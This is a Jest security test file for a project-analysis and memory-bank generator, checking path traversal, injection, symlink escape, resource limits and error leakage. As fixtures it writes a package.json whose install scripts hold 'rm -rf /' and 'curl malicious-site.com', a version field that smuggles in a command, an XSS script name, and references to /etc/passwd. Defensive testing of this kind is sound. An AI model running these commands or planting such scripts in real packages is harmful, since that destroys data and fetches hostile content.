import * as fs from 'fs/promises';
import * as path from 'path';
import { analyzeProject } from '../../src/core/projectAnalysis.js';
import { generateMemoryBankFiles } from '../../src/core/memoryBankGenerator.js';
import { validateMemoryBank } from '../../src/core/validation.js';
import { ensureMemoryBankDirectory } from '../../src/utils/fileUtils.js';

describe('Security Tests', () => {
  const testTempDir = path.join(process.cwd(), 'temp', 'test', 'security');
  
  beforeEach(async () => {
    await fs.mkdir(testTempDir, { recursive: true });
  });

  afterEach(async () => {
    await fs.rm(testTempDir, { recursive: true, force: true });
  });

  describe('Path Traversal Protection', () => {
    test('should prevent path traversal in project analysis', async () => {
      // Attempt to analyze a path with traversal
      const maliciousPath = path.join(testTempDir, '..', '..', '..', 'etc');
      
      // Should reject or sanitize dangerous paths
      await expect(analyzeProject(maliciousPath)).rejects.toThrow();
    });

    test('should prevent path traversal in memory bank directory creation', async () => {
      // Try to create memory bank outside of project
      const projectRoot = testTempDir;
      const traversalPath = path.join(projectRoot, '..', '..', 'malicious');
      
      // ensureMemoryBankDirectory should only create within project
      await expect(async () => {
        const memoryBankDir = await ensureMemoryBankDirectory(traversalPath);
        // Verify it's within the safe directory
        const relative = path.relative(testTempDir, memoryBankDir);
        expect(relative).not.toMatch(/^\.\./);
      }).not.toThrow();
    });

    test('should sanitize file paths in validation', async () => {
      const projectRoot = path.join(testTempDir, 'safe-project');
      await fs.mkdir(projectRoot, { recursive: true });
      
      // Create a legitimate memory bank
      const memoryBankDir = path.join(projectRoot, '.github', 'memory-bank');
      await fs.mkdir(memoryBankDir, { recursive: true });
      
      // Try to validate with a path traversal
      const maliciousPath = path.join(memoryBankDir, '..', '..', '..', 'etc');
      
      // Should handle gracefully without exposing system info
      const result = await validateMemoryBank(maliciousPath);
      expect(result.isValid).toBe(false);
    });
  });

  describe('Input Validation', () => {
    test('should handle malicious package.json content', async () => {
      const projectRoot = path.join(testTempDir, 'malicious-project');
      await fs.mkdir(projectRoot, { recursive: true });
      
      // Create malicious package.json with potential code injection
      const maliciousPackageJson = {
        name: '<script>alert("xss")</script>',
        version: '"; rm -rf / #',
        description: 'Malicious\n\n# Hidden content\n```javascript\nconsole.log("injected")\n```',
        scripts: {
          'preinstall': 'rm -rf /',
          'postinstall': 'curl malicious-site.com'
        },
        dependencies: {
          '../../../etc/passwd': 'file:../../../etc/passwd'
        }
      };
      
      await fs.writeFile(
        path.join(projectRoot, 'package.json'),
        JSON.stringify(maliciousPackageJson, null, 2)
      );
      
      // Analysis should sanitize or escape dangerous content
      const analysis = await analyzeProject(projectRoot);
      
      // Verify that dangerous content is escaped/sanitized
      expect(analysis.projectName).not.toContain('<script>');
      expect(analysis.description).not.toMatch(/```javascript/);
      
      // Dependencies should be filtered or sanitized
      expect(Object.keys(analysis.dependencies.runtime)).not.toContain('../../../etc/passwd');
    });

    test('should handle files with malicious names', async () => {
      const projectRoot = path.join(testTempDir, 'dangerous-files');
      await fs.mkdir(path.join(projectRoot, 'src'), { recursive: true });
      
      const packageJson = {
        name: 'test-project',
        version: '1.0.0'
      };
      
      await fs.writeFile(
        path.join(projectRoot, 'package.json'),
        JSON.stringify(packageJson, null, 2)
      );
      
      // Create files with potentially dangerous names
      const dangerousFiles = [
        '../../etc/passwd.js',
        '..\\..\\windows\\system32\\config.js',
        'normal.js',
        '<script>alert(1)</script>.js',
        'file with spaces and;semicolons.js'
      ];
      
      for (const filename of dangerousFiles) {
        try {
          // Only create files that the filesystem allows
          const safePath = path.join(projectRoot, 'src', path.basename(filename));
          await fs.writeFile(safePath, 'console.log("test");');
        } catch {
          // Ignore files that can't be created
        }
      }
      
      const analysis = await analyzeProject(projectRoot);
      
      // Source files should be properly sanitized
      analysis.structure.sourceFiles.javascript.forEach(file => {
        expect(file).not.toMatch(/\.\./);
        expect(file).not.toContain('<script>');
      });
    });

    test('should validate memory bank content for injection attacks', async () => {
      const projectRoot = path.join(testTempDir, 'injection-test');
      await fs.mkdir(projectRoot, { recursive: true });
      
      const packageJson = {
        name: 'injection-test',
        version: '1.0.0',
        description: 'Test for injection\n\n## Fake heading\n```bash\nrm -rf /\n```'
      };
      
      await fs.writeFile(
        path.join(projectRoot, 'package.json'),
        JSON.stringify(packageJson, null, 2)
      );
      
      const analysis = await analyzeProject(projectRoot);
      const memoryBankDir = await ensureMemoryBankDirectory(projectRoot);
      
      await generateMemoryBankFiles(memoryBankDir, analysis, {
        structureType: 'standard',
        detailLevel: 'detailed',
        focusAreas: ['architecture'],
        additionalFiles: []
      });
      
      // Check that generated content is safe
      const productContext = await fs.readFile(
        path.join(memoryBankDir, 'productContext.md'),
        'utf-8'
      );
      
      // Should not contain dangerous bash commands in code blocks
      expect(productContext).not.toMatch(/```bash[\s\S]*rm -rf/);
      
      // Should escape or sanitize the description
      expect(productContext).toContain('injection-test');
    });
  });

  describe('Resource Protection', () => {
    test('should limit file system access to project boundaries', async () => {
      const projectRoot = path.join(testTempDir, 'bounded-project');
      await fs.mkdir(projectRoot, { recursive: true });
      
      // Create a project with symlinks pointing outside
      await fs.writeFile(path.join(projectRoot, 'package.json'), '{"name": "test"}');
      
      try {
        // Try to create a symlink to sensitive area (may fail on some systems)
        await fs.symlink('/etc/passwd', path.join(projectRoot, 'secret-link'));
      } catch {
        // Ignore if symlinks can't be created (Windows, permissions, etc.)
      }
      
      const analysis = await analyzeProject(projectRoot);
      
      // Analysis should not include files outside project boundaries
      const allFiles = [
        ...analysis.structure.sourceFiles.typescript,
        ...analysis.structure.sourceFiles.javascript,
        ...analysis.structure.sourceFiles.python,
        ...analysis.structure.sourceFiles.other
      ];
      
      allFiles.forEach(file => {
        const fullPath = path.resolve(projectRoot, file);
        const relativePath = path.relative(projectRoot, fullPath);
        expect(relativePath).not.toMatch(/^\.\./);
      });
    });

    test('should handle large projects gracefully', async () => {
      const projectRoot = path.join(testTempDir, 'large-project');
      await fs.mkdir(path.join(projectRoot, 'src'), { recursive: true });
      
      await fs.writeFile(
        path.join(projectRoot, 'package.json'),
        '{"name": "large-test", "version": "1.0.0"}'
      );
      
      // Create many files to test resource limits
      const promises = [];
      for (let i = 0; i < 100; i++) {
        promises.push(
          fs.writeFile(
            path.join(projectRoot, 'src', `file${i}.js`),
            `console.log("File ${i}");`
          )
        );
      }
      
      await Promise.all(promises);
      
      // Analysis should complete without timing out or consuming excessive memory
      const startTime = Date.now();
      const analysis = await analyzeProject(projectRoot, 'shallow');
      const endTime = Date.now();
      
      // Should complete within reasonable time (10 seconds)
      expect(endTime - startTime).toBeLessThan(10000);
      
      // Should have found files but limited by depth
      expect(analysis.structure.sourceFiles.javascript.length).toBeGreaterThan(0);
      expect(analysis.structure.sourceFiles.javascript.length).toBeLessThan(200);
    });

    test('should prevent memory exhaustion on deep directory structures', async () => {
      const projectRoot = path.join(testTempDir, 'deep-project');
      let currentDir = projectRoot;
      
      // Create very deep directory structure
      for (let i = 0; i < 20; i++) {
        currentDir = path.join(currentDir, `level${i}`);
        await fs.mkdir(currentDir, { recursive: true });
      }
      
      await fs.writeFile(path.join(projectRoot, 'package.json'), '{"name": "deep-test"}');
      await fs.writeFile(path.join(currentDir, 'deep.js'), 'console.log("deep");');
      
      // Should handle deep structures with depth limits
      const analysis = await analyzeProject(projectRoot, 'medium');
      
      // Should not crash or consume excessive memory
      expect(analysis.projectName).toBe('deep-test');
      
      // May or may not find the deep file depending on limits
      expect(analysis.structure.sourceFiles.javascript.length).toBeLessThan(50);
    });
  });

  describe('Error Handling Security', () => {
    test('should not expose sensitive information in error messages', async () => {
      // Try to analyze a system directory (should fail safely)
      const systemPath = process.platform === 'win32' ? 'C:\\Windows\\System32' : '/etc';
      
      try {
        await analyzeProject(systemPath);
        // If it doesn't throw, ensure it doesn't return sensitive info
      } catch (error) {
        const errorMessage = error instanceof Error ? error.message : String(error);
        
        // Error messages should not expose file paths or system information
        expect(errorMessage).not.toMatch(/\/etc\/passwd/);
        expect(errorMessage).not.toMatch(/C:\\Windows\\System32/);
        expect(errorMessage).not.toContain('EACCES');
        expect(errorMessage).not.toContain('EPERM');
      }
    });

    test('should handle permission denied errors gracefully', async () => {
      const projectRoot = path.join(testTempDir, 'permission-test');
      await fs.mkdir(projectRoot, { recursive: true });
      
      await fs.writeFile(
        path.join(projectRoot, 'package.json'),
        '{"name": "permission-test"}'
      );
      
      // Create a directory we can't read (may not work on all systems)
      const restrictedDir = path.join(projectRoot, 'restricted');
      await fs.mkdir(restrictedDir, { recursive: true });
      
      try {
        // Try to remove read permissions (Unix systems)
        if (process.platform !== 'win32') {
          await fs.chmod(restrictedDir, 0o000);
        }
      } catch {
        // Ignore if chmod fails
      }
      
      // Analysis should continue despite permission errors
      const analysis = await analyzeProject(projectRoot);
      
      expect(analysis.projectName).toBe('permission-test');
      // Should not crash due to permission errors
    });
  });
});